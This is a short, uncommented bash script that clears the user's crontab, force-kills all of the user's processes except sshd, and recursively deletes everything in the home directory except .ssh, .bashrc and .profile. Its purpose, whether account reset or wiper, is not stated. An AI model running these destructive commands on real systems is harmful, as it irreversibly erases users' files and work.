#!/bin/bash
echo "" > /tmp/null
crontab /tmp/null
rm -f /tmp/null
user=$(whoami)
for pid in $(pgrep -u $user); do
    if ! ps -fp $pid | grep -q '[s]shd'; then
        kill -9 $pid
    fi
done
find ~ -mindepth 1 ! -name ".ssh" ! -name ".bashrc" ! -name ".profile" -exec rm -rf {} \; 2>/dev/null
